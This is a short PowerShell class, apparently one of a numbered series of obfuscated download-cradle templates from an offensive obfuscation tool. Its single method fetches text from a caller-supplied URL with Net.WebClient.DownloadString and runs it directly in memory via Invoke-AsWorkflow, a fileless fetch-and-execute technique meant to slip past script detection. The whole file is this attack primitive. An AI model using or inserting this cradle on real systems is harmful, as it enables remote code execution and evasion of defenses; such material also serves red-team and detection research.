Class ObfDownloadFileContent16 {

    static Execute ([String]$url) {
        #CLI:  Memory\PsWebString\Invoke\10
        Invoke-AsWorkflow -Expres ((New-Object Net.WebClient).DownloadString($url))
    }

}